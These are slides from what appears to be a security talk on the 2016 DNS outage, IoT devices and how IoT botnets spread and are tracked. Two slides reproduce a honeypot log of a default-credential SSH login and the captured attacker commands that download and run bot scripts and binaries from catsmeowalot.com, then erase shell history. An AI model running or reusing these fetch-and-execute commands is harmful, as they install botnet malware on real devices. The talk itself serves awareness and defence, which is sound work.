#HSLIDE

## What happened 21.Oct 2016
## What is DNS and why we should care
## What is/are IoT
## How to build a IoT botnet yourself and how to track one
## Why black- and whitehats love cat pictures?

#HSLIDE

#HSLIDE

DNS

#VSLIDE?image=media/43.png

#VSLIDE?image=media/46.png

#HSLIDE

##IOT

"connecting any device with an on and off switch to the Internet (and/or to each other). This includes everything from cellphones, coffee makers, washing machines, headphones, lamps, wearable devices and almost anything else you can think of.  This also applies to components of machines, for example a jet engine of an airplane or the drill of an oil rig."

.. what about Artificial cardiac pacemaker?

#HSLIDE

```
2016-10-28 05:00:46+0200 [SSHService ssh-userauth on HoneyPotTransport,913,125.17.68.42] admin trying auth password
2016-10-28 05:00:46+0200 [SSHService ssh-userauth on HoneyPotTransport,913,125.17.68.42] login attempt [admin/qwerty] succeeded
2016-10-28 05:00:49+0200 [SSHService ssh-userauth on HoneyPotTransport,913,125.17.68.42] admin authenticated with password
2016-10-28 05:00:49+0200 [SSHService ssh-userauth on HoneyPotTransport,913,125.17.68.42] starting service ssh-connection
2016-10-28 05:00:49+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] channel open
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] executing command "cd /tmp; wget http://catsmeowalot.com/lmao.sh || curl -O http://catsmeowalot.com/lmao.sh; chmod 777 lmao.sh; sh lmao.sh; busybox tftp catsmeowalot.com -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g catsmeowalot.com; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf lmao.sh tftp1.sh tftp2.sh; cd; rm -rf ./bash_history; history -c"
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Opening TTY Log: log/tty/20161028-050050-abab97cc-0e.log
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] CMD: cd /tmp; wget http://catsmeowalot.com/lmao.sh || curl -O http://catsmeowalot.com/lmao.sh; chmod 777 lmao.sh; sh lmao.sh; busybox tftp catsmeowalot.com -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g catsmeowalot.com; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf lmao.sh tftp1.sh tftp2.sh; cd; rm -rf ./bash_history; history -c
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: cd /tmp
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: wget http://catsmeowalot.com/lmao.sh
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Starting factory <HTTPProgressDownloader: http://catsmeowalot.com/lmao.sh>
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command not found: curl -O http://catsmeowalot.com/lmao.sh
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: chmod 777 lmao.sh
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command not found: sh lmao.sh
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: busybox tftp catsmeowalot.com -c get tftp1.sh
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: chmod 777 tftp1.sh
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command not found: sh tftp1.sh
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: busybox tftp -r tftp2.sh -g catsmeowalot.com
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: chmod 777 tftp2.sh
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command not found: sh tftp2.sh
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: rm -rf lmao.sh tftp1.sh tftp2.sh
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: cd
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: rm -rf ./bash_history
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: history -c
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] exitCode: 0
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] sending request exit-status
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] sending close 0
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] exitCode: 0
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] received eof, sending ctrl-d to command
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Closing TTY Log: log/tty/20161028-050050-abab97cc-0e.log after 0 seconds
2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] honeypot terminal protocol connection lost disconnected
```

#HSLIDE

```
cd /tmp && wget -q http://catsmeowalot.com/ayylmao && chmod +x ayylmao && ./ayylmao
cd /tmp && wget -q http://catsmeowalot.com/ayymips && chmod +x ayymips && ./ayymips
cd /tmp && wget -q http://catsmeowalot.com/jackmysh4 && chmod +x jackmysh4 && ./jackmysh4
cd /tmp && wget -q http://catsmeowalot.com/ayyx86 && chmod +x ayyx86 && ./ayyx86
cd /tmp && wget -q http://catsmeowalot.com/ayyarm && chmod +x ayyarm && ./ayyarm
cd /tmp && wget -q http://catsmeowalot.com/ayyi686 && chmod +x ayyi686 && ./ayyi686
cd /tmp && wget -q http://catsmeowalot.com/jackmypowerpc && chmod +x jackmypowerpc && ./jackmypowerpc
cd /tmp && wget -q http://catsmeowalot.com/ayyi586 && chmod +x ayyi586 && ./ayyi586
cd /tmp && wget -q http://catsmeowalot.com/jackmym86k && chmod +x jackmym86k && ./jackmym86k
cd /tmp && wget -q http://catsmeowalot.com/jackmysparc && chmod +x jackmysparc && ./jackmysparc
```

#HSLIDE?image=media/


#HSLIDE


Slides and more on Anycast and DNS:

```
http:// www.pch.net / resources / papers / dns-service-architecture

Bill Woodcock 
woody@pch.net

Gaurab Raj Upadhaya
gaurab@pch.net
```

#HSLIDE

* *Skiddos* did excellent awareness rising capaign, what's next?
  * INDUSTRIAL INTERNET SECURITY FRAMEWORK (http://www.iiconsortium.org/IISF.htm, ~170p)
  * Future-proofing the Connected World (https://downloads.cloudsecurityalliance.org/assets/research/internet-of-things/future-proofing-the-connected-world.pdf, ~70p)

